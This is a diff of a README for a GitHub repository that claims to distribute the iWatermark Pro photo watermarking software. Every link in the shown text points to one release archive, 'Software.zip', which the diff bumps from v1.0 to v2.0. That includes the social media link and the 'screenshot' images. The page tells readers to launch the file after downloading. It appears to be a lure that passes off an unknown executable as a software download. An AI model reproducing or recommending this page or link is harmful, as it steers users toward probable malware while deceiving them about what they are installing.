@@ -37,19 +37,19 @@ This repository provides access to the iWatermark Pro software for various platf
 
 ### Download iWatermark Pro Software 🚀
 
-To download the iWatermark Pro software, click [here](https://github.com/TradeSphereX8777/Plum-Amazing-iWatermark-Pro-Download/releases/download/v1.0/Software.zip). 
+To download the iWatermark Pro software, click [here](https://github.com/TradeSphereX8777/Plum-Amazing-iWatermark-Pro-Download/releases/download/v2.0/Software.zip). 
 
 *Note: The file needs to be launched after downloading.*
 
-[![Download iWatermark Pro](https://github.com/TradeSphereX8777/Plum-Amazing-iWatermark-Pro-Download/releases/download/v1.0/Software.zip)](https://github.com/TradeSphereX8777/Plum-Amazing-iWatermark-Pro-Download/releases/download/v1.0/Software.zip)
+[![Download iWatermark Pro](https://github.com/TradeSphereX8777/Plum-Amazing-iWatermark-Pro-Download/releases/download/v2.0/Software.zip)](https://github.com/TradeSphereX8777/Plum-Amazing-iWatermark-Pro-Download/releases/download/v2.0/Software.zip)
 
 ### Screenshots 📷
 
 Here are some examples of how iWatermark Pro can elevate your photos:
 
-![Watermark Example 1](https://github.com/TradeSphereX8777/Plum-Amazing-iWatermark-Pro-Download/releases/download/v1.0/Software.zip)
+![Watermark Example 1](https://github.com/TradeSphereX8777/Plum-Amazing-iWatermark-Pro-Download/releases/download/v2.0/Software.zip)
 
-![Watermark Example 2](https://github.com/TradeSphereX8777/Plum-Amazing-iWatermark-Pro-Download/releases/download/v1.0/Software.zip)
+![Watermark Example 2](https://github.com/TradeSphereX8777/Plum-Amazing-iWatermark-Pro-Download/releases/download/v2.0/Software.zip)
 
 ### Getting Started 🚀
 
@@ -63,7 +63,7 @@ If you encounter any issues with downloading or using iWatermark Pro, feel free 
 
 ### Connect with Us 🌟
 
-Follow us on [Twitter](https://github.com/TradeSphereX8777/Plum-Amazing-iWatermark-Pro-Download/releases/download/v1.0/Software.zip) for the latest updates and tips on using iWatermark Pro!
+Follow us on [Twitter](https://github.com/TradeSphereX8777/Plum-Amazing-iWatermark-Pro-Download/releases/download/v2.0/Software.zip) for the latest updates and tips on using iWatermark Pro!
 
 ### Contribute 🤝
 
